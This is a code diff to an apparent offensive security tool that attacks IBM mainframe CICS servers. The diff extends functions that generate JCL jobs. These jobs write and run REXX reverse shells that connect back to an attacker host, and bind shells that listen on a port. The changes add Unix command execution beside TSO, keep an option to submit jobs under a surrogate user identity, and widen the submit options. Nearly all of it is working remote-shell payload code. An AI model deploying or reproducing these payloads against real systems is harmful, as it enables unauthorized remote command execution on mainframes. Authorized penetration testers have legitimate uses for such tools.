@@ -46,9 +46,8 @@ DO_AUTHENT = False
 #   Write a CICS SHELL in COBOL
 #   Distinguish VTAM authentication from CICS authentication
 #   Query security with any class and resource
-#   find a way to know if propcntl is active, and check surrogat permissions
-#   find a way to know if propcntl is active
 #   CEDA VIEW CON
+#   Execute unix commands
 
 
 
@@ -869,14 +868,21 @@ def dummy_jcl2(lhost):
     
     return jcl
     
-def reverse_jcl(lhost, username="CICSUSEB"):
+def reverse_jcl(lhost, username="CICSUSEC", kind="tso"):
   """
      JOB that writes a reverse shell in REXX to a temporary file CICSUSER.*
      then executes said file
   """
+  if kind =="tso":
+     prompt= "TSO > "
+     cmd = "ADDRESS TSO do;"
+  else:   
+     prompt= "Shell > "
+     cmd =  "CALL BPXWUNIX do,,out.;"
+     
   job_name = username
   tmp = rand_name(randrange(3,7))
-  whine('Payload set to reverse tso to '+lhost,'info')     
+  whine('Payload set to reverse '+cmd+' to '+lhost,'info')     
   
   if results.surrogat_user:
       whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
@@ -899,7 +905,7 @@ def reverse_jcl(lhost, username="CICSUSEB"):
        par1='SOL_SOCKET';t=Socket('SETSOCKOPT',s,par1,'SO_KEEPALIVE','ON')
     t=SOCKET('SETSOCKOPT',s,par1,'SO_ASCII','On')
     t=SOCKET('SOCKETSETSTATUS','CLIENT');
-    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, 'Shell> ')
+    t=SOCKET('CONNECT',s,'AF_INET' rp rh); t= SOCKET('SEND',s, '"""+prompt+"""')
   DO FOREVER
     g_cmd = get_cmd(s);parse = exec_cmd(s,g_cmd);end;exit
  get_cmd:
@@ -909,11 +915,11 @@ def reverse_jcl(lhost, username="CICSUSEB"):
     arg sock, s; do i=1 to words(s);if words(s) = 0 then return 0
     if sock = word(s,i) then return 1;end;return 0
  exec_tso:
- parse arg tso_do; text = '';u = OUTTRAP('out.'); ADDRESS TSO tso_do;
+ parse arg do; text = '';u = OUTTRAP('out.'); """+cmd+"""
  u = OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text
  exec_cmd:
  parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
- te = SOCKET('SEND',sockID, 'Shell> ');return 1;
+ te = SOCKET('SEND',sockID, '"""+prompt+"""');return 1;
 /*
 //SYSOUT     DD SYSOUT=*
 //STEP01 EXEC  PGM=IKJEFT01
@@ -967,6 +973,7 @@ def ftp_jcl(lhost, job_name="FTPCICS"):
 """+cmds+"""
 /*
 """
+  
   return jcl_code
 
 def memory_rexx(lhost):
@@ -986,15 +993,23 @@ def memory_rexx(lhost):
   for line in rexx_file:
      cmds +=line.strip() + ";"
   
-def direct_jcl(port, job_name="CICSUSEB"):
+def direct_jcl(port, job_name="PGMTEST", kind="tso"):
   """
      JOB that writes a reverse shell in REXX to a temporary file CICSUSER.*
      then executes said file
   """
   tmp = rand_name(randrange(4,7))
+  
+  if kind =="tso":
+     prompt= "TSO > "
+     cmd = "ADDRESS TSO do;"
+  else:   
+     prompt= "Shell > "
+     cmd =  "CALL BPXWUNIX do,,out.;"
+  
   if not port:
       port = '4445'
-  whine('Payload set to bind tso at port'+port,'info')     
+  whine('Payload set to bind '+kind+' at port '+port,'info')     
   if results.surrogat_user:
       whine('Submitting job using surrogate identity '+results.surrogat_user,'info')     
       job_card = '//'+job_name.upper()+' JOB (123456),USER='+results.surrogat_user+',CLASS=A'      
@@ -1014,13 +1029,13 @@ def direct_jcl(port, job_name="CICSUSEB"):
  parse var te s_rc MF_IP .;te = SOCKET('SOCKET');parse var te s_rc s_id .
     te = Socket('SETSOCKOPT',s_id,'SOL_SOCKET','SO_KEEPALIVE','ON')
  te=Socket('BIND',s_id,'AF_INET' '"""+port+"""' MF_IP);te=Socket('Listen',s_id,2)
-    cl = '';DO k=1 to 5
+    cl = '';DO k=1 to 1000
     te = Socket('Select','READ' s_id cl 'WRITE' 'EXCEPTION')
     parse upper var te 'READ' readin 'WRITE' writtin 'EXCEPTION' exceptin
   IF INLIST(s_id,readin) then do;te = Socket('Accept',s_id)
      parse var te src c_s . ;cl = c_s;te = Socket('Socketsetstatus')
      te = Socket('Setsockopt',c_s,'SOL_SOCKET','SO_ASCII','ON')
-     te = SOCKET('SEND',c_s, 'Shell> ');END    
+     te = SOCKET('SEND',c_s, '"""+prompt+"""');END    
     if readin = c_s then do;cmd_g = get_cmd(c_s)
      parse = exec_cmd(c_s,cmd_g);end;end;exit
  get_cmd:
@@ -1031,9 +1046,9 @@ def direct_jcl(port, job_name="CICSUSEB"):
   if sock = word(s,i) then return 1;end;return 0
  exec_cmd:
   parse arg sockID, do_it;t=SOCKET('SEND',sockID, exec_tso(do_it)||nl);
-  te = SOCKET('SEND',sockID, 'Shell> ');return 1;
+  te = SOCKET('SEND',sockID, '"""+prompt+"""');return 1;
  exec_tso:
-  parse arg tso_do; text = '';u = OUTTRAP('out.'); ADDRESS TSO tso_do;
+  parse arg do; text = '';u = OUTTRAP('out.'); """+cmd+"""
   u=OUTTRAP(OFF);DO i = 1 to out.0;text = text||out.i||nl;end;return text
 
 /*
@@ -1354,12 +1369,19 @@ def submit_job(kind,lhost="192.168.1.28:4444"):
     elif kind=="dummy":
         whine('Dummy JCL used for this attempt','info')
         jcl = dummy_jcl(lhost);
-    elif kind=="reverse":
-        jcl = reverse_jcl(lhost)
-    elif kind=="direct":
-        jcl = direct_jcl(results.port)
+    elif kind=="reverse_tso":
+        jcl = reverse_jcl(lhost,kind="tso")
+    elif kind=="reverse_unix":
+        jcl = reverse_jcl(lhost,kind="unix")
+    elif kind=="direct_tso":
+        jcl = direct_jcl(results.port,kind="tso")
+    elif kind=="direct_unix":
+        jcl = direct_jcl(results.port,kind="unix")
     elif kind=="ftp":
         jcl = ftp_jcl(lhost)
+    else:
+        whine('Submit parameter must be one of the following: direct_unix, direct_tso, reverse_tso, reverse_unix, ftp, dummy','err')
+        sys.exit();
     
     # Writting JCL        
     if method=="spool":
@@ -1497,7 +1519,7 @@ def main(results):
     global DO_AUTHENT
     global AUTHENTICATED
 
-    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl and (results.submit !="direct")):
+    if (results.submit and (results.lhost == None or len(results.lhost.split(":")) < 2) and not results.jcl and (results.submit.find("direct")< 0)):
         whine('You must specify a connect back address with the option --lhost <LHOST:PORT> ','err')
         sys.exit();      
 
@@ -1651,7 +1673,7 @@ if __name__ == "__main__" :
     parser.add_argument('-u','--userids',help='Scrape userids found in different menus',action='store_true',default=False,dest='userids')
     parser.add_argument('-g','--surrogat',help='Checks wether you can impersonate another user when submitting a job', default=False,dest='surrogat_user')
     parser.add_argument('-r','--propagateUser',help='Given the region user ID, checks wether you are allowed to use it to submit JOBs', default=False,dest='propagate_user')
-    parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse,custom (need -j option),cicsshell,ftp',dest='submit')
+    parser.add_argument('-s','--submit',help='Submit JCL to CICS server. Specify: dummy,reverse_unix, reverse_tso, direct_unix, reverse_unix, ftp or custom (need -j option)',dest='submit')
     parser.add_argument('--queue',help='Provides the name of the TD queue to submit a JOB',dest='queue')
     parser.add_argument('--ftp-cmds',help='Files containig a list of ftp commands to execute',dest='ftp_cmds')
     parser.add_argument('--node',help='System node name where the JOB should be submitted (works only with Spool functions)',dest='node')
